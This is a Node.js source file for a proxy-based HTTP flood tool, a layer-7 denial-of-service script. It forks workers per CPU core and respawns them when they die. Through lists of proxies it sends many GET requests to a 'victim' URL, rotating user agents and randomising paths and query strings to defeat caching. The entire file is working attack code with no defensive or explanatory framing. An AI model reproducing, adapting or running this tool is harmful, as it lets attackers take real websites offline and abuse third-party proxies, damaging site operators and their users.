const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const { exec } = require('child_process');	
strand = require('string-random');

function randInteger(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    rand = Math.round(rand);
    return rand;
}
class xoxo {
    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
    }

    start(props) {
        this.isRunning = true;
        if (this.isRunning) {
            let socket = net.connect({host: props.proxy.host, port: props.proxy.port});
			
            socket.once('error', err => {
            });
			
            socket.once('disconnect', () => {
                if (this.isRunning)
                    this.start(props);
            });

            socket.once('data', data => {
                if (this.isRunning)
                    this.start(props);
            });
            let target = props.victim.host

		  if (props.rand_mode === 't'){target += '?rand='+strand(8, {letters: false});}
		  if (props.rand_mode === 'pt'){target += '/'+strand(10)+'?t='+strand(8, {letters: false});}
            for (let j = 0; j < props.requests; j++) {
                let userAgent = this.userAgents[randInteger(0, this.userAgents.length)];
                socket.write(`GET ${target} HTTP/1.1\r\nHost: ${props.victim.host.split('//')[1].split('/')[0]}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n`);
            }
			
			setTimeout(() => {
			process.exit(1);
			}, props.time);
        }
    }
}

if (cluster.isMaster) {
	let cpuCount = require('os').cpus().length;

	let proxy = fs.readFileSync('proxy.txt', 'utf-8').match(/\S+/g);
	let proxyCount = proxy.length;

	for (let i = 0; i < cpuCount; i += 1) {
		let worker = cluster.fork();
		worker.send({
			id: worker.id,
			proxy: proxy.splice(0, proxyCount / cpuCount)
		});

		setTimeout(() =>{
			process.exit(1);
		},process.argv[3] * 1000);
	}

	cluster.on('exit',
	function(worker) {
		console.log('Thread %d died ', worker.id);
		cluster.fork();
	});
} else {

	let workerId = null;
	let proxy = [];
	const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(value =>value.trim()).filter(value =>value !== '')

	class Start {
		constructor() {
			this.isRunning = false;

			this.xoxo = new xoxo(userAgents, () =>{});
		}

		run(props) {
			this.isRunning = true;

			if (props.method === 'xoxo') for (let i = 0; i < props.threads; i++) this.xoxo.start(props);
		}

		stop() {
			this.xoxo.stop();
			clearInterval(this.checkInterval);
		}

	}

	const start = new Start();

	process.on('message', data =>{
		workerId = data.id;
		proxy = data.proxy;
		const victim = {
			host: process.argv[2],
		};
		proxy.forEach(async p =>{
			let _proxy = p.split(':');
			start.run({
				rand_mode:process.argv[6],
				victim: victim,
				proxy: {
					host: _proxy[0],
					port: _proxy[1]
				},
				method: 'xoxo',
				threads: process.argv[4],
				requests: process.argv[5],
				time: process.argv[3] * 1000
			});
		});

	});
}